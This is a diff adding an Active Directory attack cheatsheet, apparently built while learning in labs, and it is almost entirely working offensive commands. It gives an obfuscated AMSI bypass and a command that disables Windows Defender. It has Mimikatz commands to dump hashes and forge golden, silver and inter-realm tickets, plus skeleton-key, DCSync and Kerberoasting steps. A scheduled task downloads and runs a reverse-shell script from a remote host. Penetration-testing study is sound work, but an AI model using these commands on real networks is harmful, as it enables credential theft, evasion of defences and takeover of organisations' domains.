@@ -1,0 +1,75 @@
+
+#This is my AD Cheatsheet which I extensively used while learning AD in the labs as well as my personal lab. This is not a complete list and will constantly be updated
+#Heavily inspired from Nikhil Mittal . All credits to him
+#Please understand the command , don't blindly copy paste it!
+#In some places , I kept the distinguished name of domain in such a way that all can understand the way how its written.Change it according to your domain
+
+
+
+
+Amsi bypass :- sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+
+Bypass execution policy :- powershell -ep bypass
+Powerview commands:-
+Enum users:- Get-NetUser 
+Get-NetUser | select -ExpandProperty samaccountname
+Enum computers:- Get-NetComputer 
+To see all attributes of domain admins group :- Get-NetGroup -GroupName "Domain Admins" -FullData
+To enumerate groupmembers of group domain admins:- Get-NetGroupMember -GroupName "Domain Admins"
+To find interesting shares:- Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose
+To list OUS's :- Get-NetOU
+To list all the computers in an OU :- Get-NetOU ("OU") | %{Get-NetComputer -ADSPath $_}
+To list GPO:- Get-NetGPO
+After listing GPO , for a particular gpo name:- Get-NetGPO -ADSpath '("Adspath of previous and required output")'
+To enumerate ACL of any group say domain admins:- Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs -Verbose
+To check for modify rights/permissions for the user or group:- Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "("username or groupname")"}
+To enumerate all domains in the forest:- Get-NetForestDomain -Verbose
+To map all trusts of current domain :- Get-NetDomainTrust
+To identify external trusts:- Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}
+To identify a machine where you have local admin access:- Find-LocalAdminAccess -Verbose
+Script to also find local admin access(must have the script):- Find-PSRemotingLocalAdminAccess
+Powershell remoting on machine:-Enter-PSSession -ComputerName ("computer name")
+Disable windows defender:- Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+To check for constrained language:- $ExecutionContext.SessionState.LanguageMode
+If in constrained language , check for applocker policy:- Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+To do OPTH attack of user impersonation:- Invoke-Mimikatz -Command '"sekurlsa::pth /user:("user") /domain:("domain") /ntlm:("hash" )/run:powershell.exe"'
+To dump passwords of sessions stored in cache of compromised machine:- Invoke-Mimikatz
+To check if current user has local admin privileges on any machine where a domain admin session is available:-Invoke-UserHunter -CheckAccess
+Powerhshell remoting session variable :- $sess = New-PSSession -ComputerName ("computer name")
+                                         Enter-PSSession $sess
+To run localscripts in remote pc :- Invoke-Command -FilePath .\("powershell script") -Session $sess
+Mimikatz command to dump hashes from DC(Only run in DC):- Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Mimikatz command to create golden ticket as administrator:- Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:(domain) /sid:("domain sid") /krbtgt:("krbtgt extracted hash") id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Mimikatz command to create silver ticket as administrator:- Invoke-Mimikatz -Command '"kerberos::golden /domain:(domain) /sid:("domain sid") /target:("machine name") /service:("service name , refer elsewhere") /rc4:("machine account hash") /user:Administrator /ptt"'
+
+Note, the same can be applied for service accounts as well
+Scheduled task yo download powershell script:- schtasks /create /S ("computer name for whom you acquired silver ticket"0 /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserX" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1''')'"
+To run the scheduled task:- schtasks /Run /S ("machine name") /TN "UserX"
+Mimikatz command to create skeleton key , should be run in domain controller only:- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+To dump sam hashes of a pc:- Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+To change dsrm login:- New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+To check whether studentx of domain dollarcorp.moneycorp.local has dcsync rights:- Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
+To add dcsync rights to a user studentx of same domain as above(From domain admin rights shell):- Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName studentx -Rights DCSync -Verbose
+To pull hashes from the dc once dcsync rights have been applied:- Invoke-Mimikatz -Command '"lsadump::dcsync /user:("username")"' 
+To allow remoting from any computer into dc (Domain admin privs, also script is used):- Set-RemotePSRemoting -UserName (user) -ComputerName (domain controller)
+To show which users have spn set:- Get-NetUser -SPN
+To request a ticket for kerberoasting:- Add-Type -AssemblyNAme System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "("spn name")"
+To dump tickets to disk:- Invoke-Mimikatz -Command '"kerberos::list /export"'
+To crack tickets:-python.exe .\tgsrepcrack.py .\10k-worst-pass.txt ("ticket name")   ("tgsrepcrack is a python code")
+Kerberos pre auth enum tool:- powerview_dev.ps1
+To enum users having kerberos pre auth disabled:- Get-DomainUser -PreauthNotRequired -Verbose
+To get AS-REP hash:- . .\ASREPRoast\ASREPRoast.ps1
+Get-ASREPHash -UserName ("Username") -Verbose
+To enumerate users where you have genericwrite or genericall rights then you can forceset disable kerberos preauth(Powerview_dev) assuming you are of group RDPUSERS:-Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
+To force set a kerberos disable flag on a user on whom you have sufficient rights:- Set-DomainObject -Identity (Control-User) -XOR @{useraccountcontrol=4194304} -Verbose
+To force set SPN on a user having sufficient rights:- Set-DomainObject -Identity ("User name") -Set @{serviceprincipalname='("SPN name")'} -Verbose
+To find server with Unconstrained delegation:- Get-NetComputer -Unconstrained | select -ExpandProperty name
+To pass tickets exported to disk:- Invoke-Mimikatz -Command '"kerberos::ptt ("Path to ticket")"'
+To enum users with constrained delegation:- Get-DomainUser -TrustedToAuth
+Kekeo command to ask for tgt:- kekeo # tgt::ask /user:user /domain:(domain) /rc4:(hash)
+Kekeo command to ask for tgs for a user having constrained delegation on the pretext of admin:- kekeo # tgs::s4u /tgt:(tgt generated) /user:Administrator@(domain) /service:(service)
+Cross domain attacks:-
+To show trust key to make tgs(Only in DC):- Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Create the inter-realm TGT:- Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:(domain) /sid:(domain sid) /sids:("Enterprise admins sid history) /rc4:(trust key) /service:krbtgt /target:(Parent domain) /ticket:(path to store ticket)"'
+
